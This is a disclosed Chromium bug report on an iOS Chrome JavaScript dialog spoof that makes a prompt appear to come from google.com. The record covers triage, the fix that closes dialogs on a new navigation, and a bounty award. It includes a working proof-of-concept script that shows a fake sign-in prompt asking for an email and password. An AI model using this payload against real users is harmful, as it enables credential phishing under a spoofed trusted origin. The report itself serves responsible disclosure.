# iOS Chrome Modal Dialog Spoof resulting to URL Spoof

| Field | Value |
|-------|-------|
| **Issue ID** | [40061297](https://issues.chromium.org/issues/40061297) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P2 |
| **Component** | UI>Browser>Navigation |
| **Platforms** | iOS |
| **Reporter** | pr...@gmail.com |
| **Assignee** | aj...@google.com |
| **Created** | 2022-10-10 |
| **Bounty** | $5,000.00 |

## Description

**Steps to reproduce the problem:**  

Modal dialog spoofing is possible on iOS Chrome by opening sites via http:// with \_top reference using setTimeout().

Since iOS Chrome doesn't show the origin of js modal dialog, this results in Full URL Spoof.

PoC:

<script>function y(){x=open('http://www.google.com','\_top'),x.document.body.innerHTML='<img/src=""onerror="setTimeout(function() {prompt(&quot;Sign into your account in order to access www.google.com&quot;, &quot;E-mail / Password&quot;)}, 150)">'};setTimeout(y, 3000);
</script>

Test on: <https://pwning.click/dialogspoof.php>

**Problem Description:**  

Explained above

**Additional Comments:**

\*\*Chrome version: \*\* 106.0.5249.92 \*\*Channel: \*\* Stable

**OS:** iOS

## Attachments

- [iOS_Chrome_Dialog.MOV](attachments/iOS_Chrome_Dialog.MOV) (video/quicktime, 7.0 MB)

## Timeline

### pr...@gmail.com (2022-10-10)

[Empty comment from Monorail migration]

### [Deleted User] (2022-10-10)

[Empty comment from Monorail migration]

### an...@chromium.org (2022-10-10)

@ajuma, assigned to you to take a look. Please re-route if necessary. Thanks!

[Monorail components: UI>Browser>Navigation]

### [Deleted User] (2022-10-10)

[Empty comment from Monorail migration]

### [Deleted User] (2022-10-11)

Setting milestone and target because of medium severity.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### aj...@chromium.org (2022-10-12)

We have logic that is intended to catch cases like this (where the origin requesting the prompt doesn't match the displayed origin): https://source.chromium.org/chromium/chromium/src/+/main:ios/web/web_state/ui/crw_wk_ui_handler.mm;l=276

I'll need to debug to find out why this isn't getting triggered in this case.

### [Deleted User] (2022-10-12)

Setting Pri-1 to match security severity Medium. If this is incorrect, please reset the priority. Sheriffbot won't make this change again.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### aj...@chromium.org (2022-10-13)

It turns out that the dialog is presented at a point where the displayed URL is still the attacker URL, just before the navigation to google.com.

I'll upload a patch to close all dialogs when a new navigation starts.

### pr...@gmail.com (2022-10-15)

That's true although visually js dialog appears after navigation to google.com

### gi...@appspot.gserviceaccount.com (2022-10-17)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src/+/2d0d1fc8884e34c58f00739e52340e6e4c985b15

commit 2d0d1fc8884e34c58f00739e52340e6e4c985b15
Author: Ali Juma <ajuma@chromium.org>
Date: Mon Oct 17 14:45:16 2022

[iOS] Close JS dialogs when a new navigation starts

This CL closes any JS dialogs left behind by the previous
page when a new navigation starts, since these are no
longer relevant to the user.

Bug: 1373025
Change-Id: I8bec157bf2cd83a9a15f9b83ecad2e89820e7b6a
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/3954143
Commit-Queue: Ali Juma <ajuma@chromium.org>
Reviewed-by: Gauthier Ambard <gambard@chromium.org>
Cr-Commit-Position: refs/heads/main@{#1059942}

[modify] https://crrev.com/2d0d1fc8884e34c58f00739e52340e6e4c985b15/ios/web/web_state/web_state_impl_realized_web_state.mm


### aj...@chromium.org (2022-10-17)

Yes, the code to show the dialog executes just before (as in a few milliseconds before) the navigation to google.com (which is why our current logic allows it to appear), and then is rendered in parallel with the navigation to google.com and continues to be visible after the navigation to google.com.

My patch will close this dialog after the navigation to google.com (so it will still appear but then almost immediately be closed, before the user has an opportunity to interact with it).

### aj...@chromium.org (2022-10-17)

[Empty comment from Monorail migration]

### [Deleted User] (2022-10-17)

[Empty comment from Monorail migration]

### [Deleted User] (2022-10-17)

[Empty comment from Monorail migration]

### [Deleted User] (2022-10-17)

Requesting merge to beta M107 because latest trunk commit (1059942) appears to be after beta branch point (1047731).

Requesting merge to dev M108 because latest trunk commit (1059942) appears to be after dev branch point (1058933).

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### am...@chromium.org (2022-10-17)

[Comment Deleted]

### [Deleted User] (2022-10-18)

Merge approved: your change passed merge requirements and is auto-approved for M108. Please go ahead and merge the CL to branch 5359 (refs/branch-heads/5359) manually. Please contact milestone owner if you have questions.
Merge instructions: https://chromium.googlesource.com/chromium/src.git/+/refs/heads/main/docs/process/merge_request.md
Owners: govind (Android), harrysouders (iOS), obenedict (ChromeOS), srinivassista (Desktop)

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2022-10-18)

Merge review required: M107 has already been cut for stable release.

Please answer the following questions so that we can safely process your merge request:
1. Why does your merge fit within the merge criteria for these milestones?
- Chrome Browser: https://chromiumdash.appspot.com/branches
- Chrome OS: https://goto.google.com/cros-release-branch-merge-guidelines
2. What changes specifically would you like to merge? Please link to Gerrit.
3. Have the changes been released and tested on canary?
4. Is this a new feature? If yes, is it behind a Finch flag and are experiments active in any release channels?
5. [Chrome OS only]: Was the change reviewed and approved by the Eng Prod Representative? https://goto.google.com/cros-engprodcomponents
6. If this merge addresses a major issue in the stable channel, does it require manual verification by the test team? If so, please describe required testing.

Please contact the milestone owner if you have questions.
Owners: govind (Android), eakpobaro (iOS), dgagnon (ChromeOS), pbommana (Desktop)

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### aj...@chromium.org (2022-10-18)

Given that this is not a recent regression, I'd prefer not to merge directly to Stable, and let this go out with 108 (merge to 108 is in the CQ). 

The main risks are closing dialogs that we shouldn't close, or introducing new crashes.

### am...@chromium.org (2022-10-18)

Hi ajuma@, that was my concern as well looking at this bug:fix yesterday, and resulting in me deferring approval. 107/stable is being cut today (in an hour) so this landed to close to that deadline for my comfort.
As this is medium severity, it is acceptable that this fix can be released in 108 stable instead. Removing merge-review label accordingly. 

### gi...@appspot.gserviceaccount.com (2022-10-18)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src/+/13271911b5725bfcc16eec290ee272b7748841b8

commit 13271911b5725bfcc16eec290ee272b7748841b8
Author: Ali Juma <ajuma@chromium.org>
Date: Tue Oct 18 16:39:27 2022

[iOS] Close JS dialogs when a new navigation starts

This CL closes any JS dialogs left behind by the previous
page when a new navigation starts, since these are no
longer relevant to the user.

(cherry picked from commit 2d0d1fc8884e34c58f00739e52340e6e4c985b15)

Bug: 1373025
Change-Id: I8bec157bf2cd83a9a15f9b83ecad2e89820e7b6a
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/3954143
Commit-Queue: Ali Juma <ajuma@chromium.org>
Reviewed-by: Gauthier Ambard <gambard@chromium.org>
Cr-Original-Commit-Position: refs/heads/main@{#1059942}
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/3963294
Commit-Queue: Rubber Stamper <rubber-stamper@appspot.gserviceaccount.com>
Bot-Commit: Rubber Stamper <rubber-stamper@appspot.gserviceaccount.com>
Auto-Submit: Ali Juma <ajuma@chromium.org>
Cr-Commit-Position: refs/branch-heads/5359@{#57}
Cr-Branched-From: 27d3765d341b09369006d030f83f582a29eb57ae-refs/heads/main@{#1058933}

[modify] https://crrev.com/13271911b5725bfcc16eec290ee272b7748841b8/ios/web/web_state/web_state_impl_realized_web_state.mm


### pr...@gmail.com (2022-10-31)

Can we add Security-Embargo label since this works on several other browsers? thanks!

### aj...@chromium.org (2022-11-01)

Added RV-SecurityEmbargo based on #22.

### am...@google.com (2022-11-03)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.
******************************

### am...@chromium.org (2022-11-03)

Congratulations! The VRP Panel has decided to award you $5,000 for this report. Thank you for your efforts and reporting this issue to us! 

### am...@google.com (2022-11-04)

[Empty comment from Monorail migration]

### am...@chromium.org (2022-11-28)

[Empty comment from Monorail migration]

### pg...@google.com (2022-11-29)

[Empty comment from Monorail migration]

### pg...@google.com (2022-11-29)

[Empty comment from Monorail migration]

### [Deleted User] (2023-01-23)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### is...@google.com (2024-01-09)

This issue was migrated from crbug.com/chromium/1373025?no_tracker_redirect=1

[Auto-CCs applied]
[Monorail components added to Component Tags custom field.]

### pr...@gmail.com (2025-03-13)

Hi, can we disclose this report? thanks!

### pr...@gmail.com (2025-03-26)

Ping, could someone help to remove Security Embargo label in this report so this can be disclosed?

### pg...@google.com (2025-03-26)

thanks for following up! removing SecurityEmbargo as this likely has been fixed on the other browsers by now

### ch...@google.com (2025-03-27)

This bug has been closed for more than 14 weeks. Removing issue access restrictions.

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40061297)*
